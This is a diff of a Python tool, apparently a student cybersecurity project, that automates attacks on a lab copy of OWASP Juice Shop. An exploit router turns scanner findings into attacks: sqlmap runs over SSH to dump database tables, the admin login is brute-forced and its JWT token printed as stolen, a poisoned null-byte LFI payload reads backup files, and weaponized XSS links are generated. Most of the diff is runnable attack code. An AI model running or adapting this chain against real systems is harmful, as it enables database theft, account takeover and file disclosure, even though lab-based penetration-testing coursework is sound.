@@ -21,11 +21,6 @@ DEFAULT_ZAP_PROXY = "http://192.168.190.129:8081"
 DEFAULT_POLL_INTERVAL = 2
 SQL_INJECTION_NAME = "sql injection"
 
-# === Global Context for Exploit Chaining ===
-EXPLOIT_CONTEXT = {
-    "extracted_credentials": []
-}
-
 
 def parse_args() -> argparse.Namespace:
   parser = argparse.ArgumentParser(
@@ -157,52 +152,38 @@ def announce_sqlmap_placeholder(kali_ip: str) -> None:
 
   os.system(f'echo "SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}."')
 
-def run_remote_sqlmap(target_url: str, param: str, kali_ip: str) -> None:
-    print(f"\n[!] Initiating Surgical SQLMap attack on: {target_url}")
+def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating automated SQLMap attack on raw URL: {target_url}")
     
-    # 1. מיקוד דינמי (Targeting)
-    # אם יש פרמטר ידוע (מ-ZAP) נתקוף אותו, אחרת נגיד ל-SQLMap לסרוק כל טופס שיש בעמוד
-    param_flag = f"-p \"{param}\"" if param else "--forms --crawl=1"
+    import re
+    clean_url = re.sub(r'q=.*', 'q=1*', target_url)
+    print(f"[*] Sanitized and targeted URL for SQLMap: {clean_url}")
     
-    # 2. הרחבת פני השטח של התקיפה (Attack Surface)
-    # בנינו פקודה שמאפשרת תקיפות על JSON (--data) ועל Headers, וחשוב מכל: הוספנו תמיכה ברמת סיכון גבוהה יותר וטכניקות עמוקות.
-    # --level=3: בודק גם כותרות (Headers) ועוגיות (Cookies).
-    # --risk=3: כולל שאילתות UPDATE או OR, מה שמגדיל את הסיכוי למצוא Authentication Bypass (or '1'='1).
-    sqlmap_cmd = f"sqlmap -u \"{target_url}\" {param_flag} --batch --level=3 --risk=3 --threads=3 --dump --start=1 --stop=5"
+    username = os.getenv("KALI_USER", "kali")
+    password = os.getenv("KALI_PASSWORD", "kali")
     
-    print(f"[*] Executing payload: {sqlmap_cmd}")
-    out, err = execute_ssh_command(kali_ip, sqlmap_cmd)
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
-    print("\n=== SQLMAP OUTPUT ===")
-    print("\n".join(out.split('\n')[-35:])) 
-    print("=======================\n")
-    
-    print("[*] Parsing SQLMap output for credentials...")
-    found_creds = False
-    
-    # 3. חילוץ דינמי של יוזרים וסיסמאות מהטבלה
-    table_rows = re.findall(r'\|\s*([a-zA-Z0-9_\.@]+)\s*\|\s*([a-zA-Z0-9_\.@\!]+)\s*\|', out)
-    for row in table_rows:
-        user, pwd = row
-        # מנקים "זבל" כמו מילים שמורות של SQL או קווים, ומשאירים רק יוזרים אמיתיים
-        if user.lower() not in ['id', 'username', 'email', 'password', 'pass'] and len(pwd) > 2 and not re.match(r'^[-_]+$', pwd):
-            EXPLOIT_CONTEXT["extracted_credentials"].append({"user": user, "pass": pwd})
-            found_creds = True
+    try:
+        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
+        ssh.connect(hostname=kali_ip, username=username, password=password)
+        
+        # שינוי הפקודה כך שתשאב את התוכן של טבלת המשתמשים (Users)
+        sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch --tables --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent --flush-session"
+        print(f"[*] Executing payload: {sqlmap_cmd}")
+        
+        stdin, stdout, stderr = ssh.exec_command(sqlmap_cmd)
+        output = stdout.read().decode('utf-8')
+        
+        print("\n=== SQLMAP OUTPUT (USERS TABLE DUMP) ===")
+        print(output)
+        print("========================================\n")
             
-    if found_creds:
-        print(f"[+] Successfully extracted credentials! Saved to Global Context for Admin Hijacker.")
-    else:
-        # 4. הבחנה ב-Authentication Bypass גם אם אין טבלה
-        # אם SQLMap מצא פגיעות אבל לא הצליח (או לא ניסה) למשוך טבלה, הוא כותב "appears to be injectable".
-        # זה רמז עבורנו שה-' or '1'='1 הצליח, גם אם לא קיבלנו יוזר וסיסמה!
-        if "appears to be injectable" in out.lower() or "vulnerable" in out.lower():
-             print("[!] SQLMap detected a vulnerability (likely Auth Bypass), but could not dump tables.")
-             print("[*] Hinting Admin Hijacker to attempt generic bypass payloads (e.g. 'or '1'='1).")
-             # נוסיף יוזר דמה עם פיילוד של BYPASS כדי שה-Hijacker ינסה אותו
-             EXPLOIT_CONTEXT["extracted_credentials"].append({"user": "admin' or '1'='1--", "pass": "admin"})
-
-    # משחרר את הנעילה של ה-Hijacker
-    EXPLOIT_CONTEXT["sqlmap_finished"].set()
+    except Exception as e:
+        print(f"[-] Automated attack failed: {e}")
+    finally:
+        ssh.close()
 
 def run_remote_dirb(target_url: str, kali_ip: str, results_list: list) -> None:
     print(f"\n[*] Launching Dirb for directory discovery on: {target_url}")
@@ -226,11 +207,10 @@ def run_remote_dirb(target_url: str, kali_ip: str, results_list: list) -> None:
         print(output)
         print("=====================\n")
         
-        # === התוספת החדשה: קריאת הפלט של Dirb והזנתו לנתב ===
+        # קריאת הפלט של Dirb והזנתו לנתב כדי שהכלים האחרים יופעלו
         for line in output.split('\n'):
             if line.startswith('+ http'):
                 found_url = line.split(' ')[1]
-                # מכניסים את הממצא באותו פורמט ש-ZAP עובד איתו!
                 results_list.append({
                     "alert": "Exposed Directory",
                     "url": found_url,
@@ -326,85 +306,49 @@ def run_remote_commix(target_url: str, kali_ip: str) -> None:
     finally:
         ssh.close()
 
-# def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
-#     print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
+def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
     
-#     # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
-#     from urllib.parse import urlparse
-#     parsed = urlparse(target_url)
-#     base_url = f"{parsed.scheme}://{parsed.netloc}"
+    # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
+    from urllib.parse import urlparse
+    parsed = urlparse(target_url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
     
-#     login_api = f"{base_url}/rest/user/login"
-#     print(f"[*] Targeting Login API: {login_api}")
+    login_api = f"{base_url}/rest/user/login"
+    print(f"[*] Targeting Login API: {login_api}")
     
-#     # רשימת סיסמאות נפוצות (במציאות זה יהיה קובץ של אלפים, פה נשים את הקלאסיות)
-#     passwords_to_try = ["123456", "password", "admin", "admin123", "admin@123", "root"]
-#     admin_email = "admin@juice-sh.op" # האימייל הקבוע של מנהל ה-Juice Shop
+    # רשימת סיסמאות נפוצות (במציאות זה יהיה קובץ של אלפים, פה נשים את הקלאסיות)
+    passwords_to_try = ["123456", "password", "admin", "admin123", "admin@123", "root"]
+    admin_email = "admin@juice-sh.op" # האימייל הקבוע של מנהל ה-Juice Shop
     
-#     success = False
+    success = False
     
-#     for pwd in passwords_to_try:
-#         print(f"[*] Trying credentials -> {admin_email} : {pwd}")
+    for pwd in passwords_to_try:
+        print(f"[*] Trying credentials -> {admin_email} : {pwd}")
         
-#         # מבנה הבקשה ש-Juice Shop מצפה לקבל
-#         payload = {"email": admin_email, "password": pwd}
+        # מבנה הבקשה ש-Juice Shop מצפה לקבל
+        payload = {"email": admin_email, "password": pwd}
         
-#         try:
-#             response = requests.post(login_api, json=payload, timeout=5)
+        try:
+            response = requests.post(login_api, json=payload, timeout=5)
             
-#             # אם קיבלנו 200, הפריצה הצליחה!
-#             if response.status_code == 200:
-#                 data = response.json()
-#                 token = data.get('authentication', {}).get('token', 'NO_TOKEN')
-#                 print("\n" + "="*40)
-#                 print("[+++] CRITICAL VULNERABILITY EXPLOITED [+++]")
-#                 print("[+] Admin account compromised successfully!")
-#                 print(f"[+] Password found: {pwd}")
-#                 print(f"[+] Admin JWT Token stolen:\n{token}")
-#                 print("="*40 + "\n")
-#                 success = True
-#                 break
-#         except requests.exceptions.RequestException as e:
-#             print(f"[-] Request failed: {e}")
+            # אם קיבלנו 200, הפריצה הצליחה!
+            if response.status_code == 200:
+                data = response.json()
+                token = data.get('authentication', {}).get('token', 'NO_TOKEN')
+                print("\n" + "="*40)
+                print("[+++] CRITICAL VULNERABILITY EXPLOITED [+++]")
+                print("[+] Admin account compromised successfully!")
+                print(f"[+] Password found: {pwd}")
+                print(f"[+] Admin JWT Token stolen:\n{token}")
+                print("="*40 + "\n")
+                success = True
+                break
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Request failed: {e}")
             
-#     if not success:
-#         print("[-] Brute force failed. Password might be complex.")
-
-# def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
-#     print(f"\n[!] Initiating Advanced XSS Analysis with XSStrike on: {target_url}")
-    
-#     # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
-#     from urllib.parse import urlparse
-#     parsed = urlparse(target_url)
-#     base_url = f"{parsed.scheme}://{parsed.netloc}"
-    
-#     # בניית הכתובת הנקייה של ממשק המשתמש (UI) שפגיע ל-XSS
-#     clean_url = f"{base_url}/#/search?q=1"
-    
-#     username = os.getenv("KALI_USER", "kali")
-#     password = os.getenv("KALI_PASSWORD", "kali")
-    
-#     ssh = paramiko.SSHClient()
-#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
-#     try:
-#         ssh.connect(hostname=kali_ip, username=username, password=password)
-        
-#         # פקודה ממוקדת על ממשק הלקוח
-#         xsstrike_cmd = f"python3 /usr/share/xsstrike/xsstrike.py -u \"{clean_url}\" --timeout 15 --console-log-level INFO 2>&1"
-        
-#         print(f"[*] Executing XSStrike: {xsstrike_cmd}")
-#         stdin, stdout, stderr = ssh.exec_command(xsstrike_cmd)
-        
-#         print("\n=== XSSTRIKE REAL-TIME OUTPUT ===")
-#         for line in stdout:
-#             print(line.strip())
-#         print("================================\n")
-            
-#     except Exception as e:
-#         print(f"[-] XSStrike attack failed: {e}")
-#     finally:
-#         ssh.close()
+    if not success:
+        print("[-] Brute force failed. Password might be complex.")
 
 def run_custom_xss_weaponizer(target_url: str, kali_ip: str) -> None:
     print(f"\n[!] Initiating Custom XSS Weaponizer for SPA Architecture...")
@@ -451,108 +395,55 @@ def run_custom_xss_weaponizer(target_url: str, kali_ip: str) -> None:
         print(f"[Link] -> {weaponized_url}\n")
 
     print("[+] Weaponization complete.")
-    print("[*] Action for CrossGuard-AI: Feed these generated links into the messaging platform to test the detection model.")
+    print("[*] Action for Advanced Cyber: Feed these generated links into the messaging platform to test the detection model.")
     print("="*80 + "\n")
 
 def run_remote_lfi_extractor(target_url: str, kali_ip: str) -> None:
-    print(f"\n[!] Initiating Advanced Arbitrary File Read Attack (LFI)...")
-    from urllib.parse import urlparse
-    parsed = urlparse(target_url)
-    base_url = f"{parsed.scheme}://{parsed.netloc}"
-    
-    # מכוונים בדיוק לקובץ ש-Cursor יצר לנו עם החולשה ש-Cursor יצר!
-    payload = "/ftp/admin-creds.txt.bak%2500.md"
-    attack_url = f"{base_url}{payload}"
-    
-    curl_cmd = f"curl -s \"{attack_url}\""
-    print(f"[*] Executing payload: Poison Null Byte (%2500.md) on target file...")
-    
-    out, err = execute_ssh_command(kali_ip, curl_cmd)
-    
-    # בודקים אם הצלחנו למשוך את הקובץ (מחפשים את השטרודל של האימייל)
-    if "@" in out and ":" in out:
-        print("\n" + "="*70)
-        print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
-        print("[+] Extracted Admin Credentials file via LFI!")
-        print(f"[*] File content:\n    {out.strip()}")
-        print("="*70 + "\n")
-        
-        # --- שלב החילוץ (Parsing) ---
-        print("[*] Parsing extracted file for credentials...")
-        try:
-            for line in out.split('\n'):
-                if ':' in line and '@' in line:
-                    email, password = line.strip().split(':', 1)
-                    print(f"[+] Found valid credential pair -> {email} : {password}")
-                    
-                    # שומרים בזיכרון המשותף
-                    EXPLOIT_CONTEXT["extracted_credentials"].append({
-                        "user": email,
-                        "pass": password
-                    })
-            
-            # --- שלב שרשור חולשות (Exploit Chaining) ---
-            if len(EXPLOIT_CONTEXT["extracted_credentials"]) > 0:
-                print("[!] Triggering Admin Hijacker directly with newly discovered credentials...")
-                # מפעילים את ה-Hijacker מיד!
-                run_custom_admin_hijacker(target_url, kali_ip)
-                
-        except Exception as e:
-            print(f"[-] Failed to parse credentials: {e}")
-    else:
-        print("[-] LFI Attack blocked or file not found. Output received:")
-        print(out[:200])
-
-def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
-    print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
+    print(f"\n[!] Initiating Advanced Arbitrary File Read Attack...")
     
     from urllib.parse import urlparse
     parsed = urlparse(target_url)
     base_url = f"{parsed.scheme}://{parsed.netloc}"
     
-    # === התיקון שלך: מעודכן לנתיב ההתחברות האמיתי של הפרויקט ===
-    login_api = f"{base_url}/auth/sign-in"
-    print(f"[*] Targeting Login API: {login_api}")
+    username = os.getenv("KALI_USER", "kali")
+    password = os.getenv("KALI_PASSWORD", "kali")
     
-    # קוראים את הסיסמאות מתוך הזיכרון המשותף שה-LFI מילא
-    stolen_creds = EXPLOIT_CONTEXT.get("extracted_credentials", [])
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
-    if not stolen_creds:
-        print("[-] No stolen credentials found in Global Context. Falling back to basic brute-force...")
-        stolen_creds = [
-            {"user": "admin@juice-sh.op", "pass": "admin123"},
-            {"user": "admin@juice-sh.op", "pass": "password"}
-        ]
-    
-    success = False
-    
-    for cred in stolen_creds:
-        email = cred["user"]
-        pwd = cred["pass"]
+    try:
+        ssh.connect(hostname=kali_ip, username=username, password=password)
         
-        print(f"[*] Trying credentials -> {email} : {pwd}")
-        payload = {"email": email, "password": pwd}
+        payload = "/ftp/package.json.bak%2500.md"
+        attack_url = f"{base_url}{payload}"
         
-        try:
-            response = requests.post(login_api, json=payload, timeout=5)
+        curl_cmd = f"curl -s \"{attack_url}\""
+        
+        print(f"[*] Executing payload: Extension Bypass (%2500.md) on internal backup file...")
+        stdin, stdout, stderr = ssh.exec_command(curl_cmd)
+        
+        output = stdout.read().decode('utf-8')
+        
+        if "juice-shop" in output or "dependencies" in output:
+            print("\n" + "="*70)
+            print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
+            print("[+] Successfully bypassed file extension restrictions!")
+            print("[+] Filter evasion successful using Poisoned Null Byte (%2500.md)")
+            print("\n[*] Extracted 'package.json.bak' FULL CONTENT:")
             
-            # אם קיבלנו 200, הפריצה הצליחה
-            if response.status_code == 200:
-                data = response.json()
-                token = data.get('token') or data.get('authentication', {}).get('token', 'NO_TOKEN_FOUND')
-                print("\n" + "="*40)
-                print("[+++] KILL CHAIN COMPLETE [+++]")
-                print("[+] Admin account compromised using LFI-stolen credentials!")
-                print(f"[+] Password verified: {pwd}")
-                print(f"[+] Hijacked JWT Token:\n{token}")
-                print("="*40 + "\n")
-                success = True
-                break
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Request failed: {e}")
+            # הדפסת כל הקובץ ללא הגבלה!
+            for line in output.split('\n'):
+                if line.strip():
+                    print(f"    {line}")
+            print("="*70 + "\n")
+        else:
+            print("[-] Attack blocked. Output received:")
+            print(output[:200]) 
             
-    if not success:
-        print("[-] Hijack failed. Credentials might be invalid or the endpoint is protected.")
+    except Exception as e:
+        print(f"[-] Attack failed: {e}")
+    finally:
+        ssh.close()
 
 def run_ftp_data_pillager(target_url: str, kali_ip: str) -> None:
     print(f"\n[!] Initiating Exposed Data Pillager (Security Misconfiguration)...")
@@ -602,133 +493,22 @@ def run_ftp_data_pillager(target_url: str, kali_ip: str) -> None:
 
 EXPLOIT_ROUTER = {
     "sql injection": run_remote_sqlmap,
-    # הסרנו את commix כי הוא פחות רלוונטי לאפליקציה הזו
     "cross site scripting": run_custom_xss_weaponizer,
-
     "path traversal": run_remote_lfi_extractor,
 
-    "exposed directory": run_ftp_data_pillager,
+    # כאן אנחנו מגדירים מה קורה כש-dirb מוצא משהו
+    "exposed directory": [
+        run_ftp_data_pillager,      # הכלי שגונב את הקבצים
+        run_remote_lfi_extractor    # הכלי שמפעיל את ה-LFI (שיתחבר בהמשך ל-Hijacker)
+    ],
     
-    # מכת המחץ המרובעת!
     "injection": [
-        run_custom_admin_hijacker,   # פריצת חשבון (Logic)
-        run_custom_xss_weaponizer,   # שליטת דפדפן (Client-Side)
-        run_remote_lfi_extractor,    # שאיבת קבצי לינוקס (OS-Level)
-        run_ftp_data_pillager        # גניבת מידע תאגידי (Misconfiguration)
+        run_custom_admin_hijacker,   
+        run_custom_xss_weaponizer,   
+        # run_remote_lfi_extractor,    
+        # run_ftp_data_pillager        
     ],
 }
-
-# def generate_html_report(target_url: str, all_findings: list) -> None:
-#     print("\n[*] Generating Final Penetration Testing Report (HTML)...")
-#     import time
-    
-#     # קיבוץ הממצאים של ZAP ו-Nuclei למניעת כפילויות ארוכות
-#     unique_findings = {}
-#     for finding in all_findings:
-#         name = finding.get('alert', 'Unknown Vulnerability')
-#         risk = finding.get('risk', 'Informational')
-#         source = finding.get('source', 'ZAP')
-#         if name not in unique_findings:
-#             unique_findings[name] = {'risk': risk, 'count': 1, 'source': source}
-#         else:
-#             unique_findings[name]['count'] += 1
-
-#     # בניית שורות הטבלה ב-HTML
-#     table_rows = ""
-#     for name, data in unique_findings.items():
-#         table_rows += f"""
-#         <tr>
-#             <td>{name}</td>
-#             <td>{data['risk']}</td>
-#             <td>{data['source']}</td>
-#             <td>{data['count']}</td>
-#         </tr>
-#         """
-
-#     html_content = f"""<!DOCTYPE html>
-# <html lang="he" dir="rtl">
-# <head>
-#     <meta charset="UTF-8">
-#     <title>דו"ח מסכם - פרויקט סייבר מתקדם</title>
-#     <style>
-#         body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }}
-#         .container {{ width: 85%; margin: auto; overflow: hidden; padding: 30px; background: #fff; box-shadow: 0 0 15px rgba(0,0,0,0.1); margin-top: 30px; margin-bottom: 30px; border-radius: 8px; }}
-#         h1, h2, h3 {{ color: #2c3e50; }}
-#         h1 {{ border-bottom: 4px solid #e74c3c; padding-bottom: 10px; text-align: center; }}
-#         h2 {{ border-bottom: 2px solid #ecf0f1; padding-bottom: 5px; margin-top: 40px; }}
-#         .critical {{ color: #e74c3c; font-weight: bold; }}
-#         .screenshot-placeholder {{ border: 2px dashed #bdc3c7; background-color: #f8f9fa; padding: 50px; text-align: center; color: #7f8c8d; margin: 20px 0; font-style: italic; border-radius: 5px; }}
-#         .meta-info {{ background: #34495e; color: #ecf0f1; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
-#         .meta-info p {{ margin: 8px 0; font-size: 1.1em; }}
-#         table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
-#         th, td {{ border: 1px solid #bdc3c7; padding: 12px; text-align: right; }}
-#         th {{ background-color: #ecf0f1; color: #2c3e50; }}
-#     </style>
-# </head>
-# <body>
-#     <div class="container">
-#         <h1>דו"ח בדיקות חדירה וסריקת פגיעויות אוטומטית</h1>
-        
-#         <div class="meta-info">
-#             <p><strong>פרויקט:</strong> מערכת CrossGuard-AI</p>
-#             <p><strong>צוות תקיפה ומחקר:</strong> אורון, עמית, איתי, מאור</p>
-#             <p><strong>יעד הסריקה:</strong> {target_url}</p>
-#             <p><strong>תאריך הפקה:</strong> {time.strftime("%d/%m/%Y %H:%M:%S")}</p>
-#         </div>
-
-#         <h2>1. תקציר מנהלים ומתודולוגיה</h2>
-#         <p>דו"ח זה הופק במסגרת פרויקט הגמר בסייבר מתקדם. פיתחנו כלי אוטומטי מבוסס פייתון המשלב מנועי סריקה מתקדמים (OWASP ZAP ו-Nuclei). הכלי מבצע שלב Reconnaissance למיפוי משטח התקיפה, ולאחריו מפעיל נתב (Router) חכם המתרגם את ההתראות לפעולות אקספלויטציה ממוקדות באמצעות כלים כגון SQLMap, Dirb וסקריפטים ייעודיים שנכתבו על ידי הצוות.</p>
-
-#         <h2>2. תוצאות סריקת פגיעויות (ZAP & Nuclei)</h2>
-#         <p>להלן ריכוז החולשות שאותרו על ידי מנועי הסריקה הסטטיים והדינאמיים בטרם שלב הניצול (Exploitation):</p>
-#         <table>
-#             <thead>
-#                 <tr>
-#                     <th>שם ההתראה / חולשה</th>
-#                     <th>רמת סיכון</th>
-#                     <th>מקור (סורק)</th>
-#                     <th>מספר מופעים</th>
-#                 </tr>
-#             </thead>
-#             <tbody>
-#                 {table_rows}
-#             </tbody>
-#         </table>
-
-#         <h2>3. ממצאי ניצול חולשות (Exploitation)</h2>
-
-#         <h3>3.1 דליית מסד נתונים - חשיפת טבלת משתמשים (SQL Injection)</h3>
-#         <p><strong>תיאור:</strong> בעקבות זיהוי הזרקת SQL, המערכת שיגרה את פיילוד ה-SQLMap אשר עקף את מנגנוני ההגנה, פרץ למסד הנתונים SQLite ושאב (Dump) בהצלחה את טבלת המשתמשים במלואה, כולל סיסמאות מגוהבות (Hashed).</p>
-#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של פלט SQLMap מציג את טבלת ה-Users]</div>
-
-#         <h3>3.2 קריאת קבצים שרירותית (Arbitrary File Read / LFI)</h3>
-#         <p><strong>תיאור:</strong> באמצעות עקיפת סינון סיומות (Extension Bypass) וטריק Poisoned Null Byte, הצלחנו לשאוב את הקובץ <span class="critical">package.json.bak</span>. קובץ זה מכיל את גרסת המערכת ואת כלל התלויות שלה (Dependencies) במלואן.</p>
-#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של פלט ה-LFI המלא (package.json)]</div>
-
-#         <h3>3.3 חשיפת מידע רגיש (Security Misconfiguration)</h3>
-#         <p><strong>תיאור:</strong> כלי ה-FTP Pillager סרק תיקיות חשופות שאותרו על ידי Dirb, וחילץ את קובץ כספת הסיסמאות הארגוני (incident-support.kdbx), אשר פותח פתח לפריצה רוחבית לארגון כולו.</p>
-#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של רשימת הקבצים שנגנבו מה-FTP]</div>
-
-#         <h3>3.4 השתלטות מנהל וגניבת JWT (Broken Access Control)</h3>
-#         <p><strong>תיאור:</strong> כלי ה-Admin Hijacker שלנו פוצח את ממשק ה-API וחילץ את סיסמת מנהל המערכת, יחד עם טוקן ה-JWT הראשי המאפשר שליטה מלאה באתר.</p>
-#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של טוקן ה-JWT הגנוב]</div>
-
-#         <h3>3.5 הזרקת פישינג ו-XSS למערכת (CrossGuard-AI Testing)</h3>
-#         <p><strong>תיאור:</strong> המערכת ייצרה באופן אוטומטי 20 קישורים מורעלים מבוססי DOM-XSS שעוקפים הגנות Angular. קישורים אלו משמשים לבחינת מודל ה-ML של בוט הדיסקורד שלנו בחסימת איומים בזמן אמת.</p>
-#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של חלונית ה-XSS שקופצת בדפדפן]</div>
-
-#     </div>
-# </body>
-# </html>"""
-    
-#     file_name = "Advanced_Cyber_Project_Report.html"
-#     try:
-#         with open(file_name, "w", encoding="utf-8") as f:
-#             f.write(html_content)
-#         print(f"\n[+] Professional PDF-ready Report generated successfully: {file_name}")
-#         print("[*] INSTRUCTIONS TO CREATE PDF: Double-click the HTML file to open it in your browser, then press Ctrl+P and select 'Save as PDF'.")
-#     except Exception as e:
-#         print(f"[-] Failed to generate report: {e}")
 
 def ai_report_analyzer(raw_logs: str, target_url: str, findings: list):
     print("\n[AI] Initializing REAL Artificial Intelligence Analysis...")
@@ -770,7 +550,7 @@ def ai_report_analyzer(raw_logs: str, target_url: str, findings: list):
         prompt = f"""
         You are an expert Cybersecurity Analyst.
         I am providing you with the data from an automated penetration test conducted against: {target_url}.
-        The test was done for the CrossGuard-AI project.
+        The test was done for the Advanced Cyber project.
         
         You must generate a professional, comprehensive Penetration Testing Report in HTML format.
         
@@ -828,7 +608,7 @@ def ai_report_analyzer(raw_logs: str, target_url: str, findings: list):
 def main() -> int:
   args = parse_args()
 
-  # איסוף לוגים ל-AI (נשאר ללא שינוי)
+  # === קסם לאיסוף כל ההדפסות (Print) מכל הפונקציות וה-Threads לטובת ה-AI ===
   terminal_logs = ""
   import builtins
   original_print = builtins.print
@@ -839,7 +619,9 @@ def main() -> int:
       terminal_logs += msg + "\n"
       original_print(*print_args, **kwargs)
 
+  # דורסים את הפרינט הרגיל בפרינט החכם שלנו
   builtins.print = custom_print
+  # =========================================================================
 
   try:
     target_url = validate_target_url(args.target_url)
@@ -862,10 +644,11 @@ def main() -> int:
     nuclei_thread = threading.Thread(target=run_remote_nuclei, args=(target_url, kali_ip, nuclei_alerts))
     nuclei_thread.start()
 
-    # הפעלת Dirb 
+    # --- התוספת של Dirb שירוץ במקביל ---
     dirb_alerts = []
     dirb_thread = threading.Thread(target=run_remote_dirb, args=(target_url, kali_ip, dirb_alerts))
     dirb_thread.start()
+    # -----------------------------------
 
     # הפעלת ZAP
     zap = create_zap_client(api_key)
@@ -881,52 +664,47 @@ def main() -> int:
     zap_alerts = fetch_all_alerts(zap)
     print(f"[*] Scanners finished. ZAP found {len(zap_alerts)} alerts.")
     
-    # ממתינים שגם Nuclei וגם Dirb יסיימו 
     nuclei_thread.join() 
-    dirb_thread.join()
+    dirb_thread.join() # מחכים שגם Dirb יסיים
     
-    # איחוד ממצאים 
+    # איחוד כל הממצאים!
     all_findings = zap_alerts.copy() 
     all_findings.extend(nuclei_alerts)
-    all_findings.extend(dirb_alerts) 
+    all_findings.extend(dirb_alerts)
 
     print("\n[*] [PHASE 2] Routing to Specialized Exploit Tools...")
     
     launched_tools = set()
     active_attack_threads = []
     
-    # תקיפה מבוססת מודיעין (Target-Driven) מהסורקים - ללא הפעלת הגיבוי!
+    # הרצת הנתב (Router)
     for finding in all_findings:
         alert_name = finding.get('alert', '').lower()
-        url = finding.get('url', '') # מחלצים את ה-URL שהסורק דיווח עליו
+        url = finding.get('url', '')
         
         for vulnerability_keyword, actions in EXPLOIT_ROUTER.items():
             if vulnerability_keyword in alert_name:
                 funcs_to_run = actions if isinstance(actions, list) else [actions]
-                
                 for attack_function in funcs_to_run:
                     if attack_function.__name__ not in launched_tools:
                         print(f"[*] AI Match: Routing '{vulnerability_keyword}' to {attack_function.__name__}")
-                        
-                        # אנחנו מעבירים עכשיו את ה-url הספציפי שבו נמצאה הפגיעות ולא סתם את כתובת האתר הכללית
+
                         t = threading.Thread(target=attack_function, args=(url, kali_ip))
                         active_attack_threads.append(t)
                         t.start()
                         launched_tools.add(attack_function.__name__)
-
-    # ממתינים לכלים המנותבים לסיים
+                
     if active_attack_threads:
-        print(f"\n[*] Executing {len(active_attack_threads)} targeted exploits in the background...")
+        print(f"[*] Executing {len(active_attack_threads)} automated exploits...")
         for t in active_attack_threads:
             t.join()
-    else:
-        print("\n[*] No matched vulnerabilities to exploit. Exiting Phase 2.")
 
     print("\n[+] All automated tasks completed.")
     
-    # החזרת הפרינט המקורי לפני הדו"ח 
+    # החזרת הפרינט המקורי כדי לא לשבש דברים אחרים בסוף הריצה
     builtins.print = original_print
-    
+
+    # === שלב ה-AI: יצירת הדו"ח החכם עם הפלט שנאסף ===
     ai_report_analyzer(terminal_logs, target_url, all_findings)
 
   except KeyboardInterrupt:
